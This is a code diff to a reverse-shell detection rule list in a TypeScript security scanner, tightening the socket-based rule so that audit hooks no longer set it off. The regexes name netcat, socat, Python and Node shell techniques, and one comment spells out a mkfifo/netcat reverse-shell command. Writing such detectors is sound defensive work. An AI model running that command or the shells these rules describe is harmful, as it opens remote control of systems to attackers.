@@ -23,7 +23,8 @@ export const SECURITY_PATTERNS: PatternRule[] = [
   { id: 'RS-002', pattern: /\b(?:nc|ncat|netcat)\b.*(?:-e|-c|--exec|--sh-exec)\s+\S*(?:\/(?:ba|z)?sh\b|cmd)/i, category: 'reverse-shell', severity: 'critical', description: 'Netcat reverse shell' },
   { id: 'RS-003', pattern: /\bnet\.connect\s*\(.*\bchild_process\b/i, category: 'reverse-shell', severity: 'critical', description: 'Node.js net.connect reverse shell' },
   { id: 'RS-004', pattern: /\bnew\s+WebSocket\b.*\bchild_process\b/is, category: 'reverse-shell', severity: 'critical', description: 'WebSocket reverse shell' },
-  { id: 'RS-005', pattern: /\bsocket\b.*(?:\bsubprocess\.|\b(?:exec|execSync|spawn|spawnSync|popen)\s*\(|\bos\.dup2\s*\()/i, category: 'reverse-shell', severity: 'critical', description: 'Socket-based reverse shell' },
+  // A socket wired to a shell — not any line naming both (an audit hook that blocks `socket.` and `subprocess.`)
+  { id: 'RS-005', pattern: /\bsocket\.socket\s*\(.*(?:\bos\.dup2\s*\(|\bpty\.spawn\s*\(|\bsubprocess\.\w+\s*\(.*\b(?:ba|z|k)?sh\b)|\bsocket\b.*\.on\s*\(\s*['"]data['"].*\b(?:exec|execSync|spawn|spawnSync)\s*\(/i, category: 'reverse-shell', severity: 'critical', description: 'Socket-based reverse shell' },
   { id: 'RS-006', pattern: /python\S*\s+-c\s+['"]import\s+socket/i, category: 'reverse-shell', severity: 'critical', description: 'Python reverse shell' },
   { id: 'RS-007', pattern: /\bsocat\b.*\bexec:/i, category: 'reverse-shell', severity: 'critical', description: 'Socat reverse shell' },
   // `mkfifo f; cat f | sh -i 2>&1 | nc host port > f` — netcat without -e
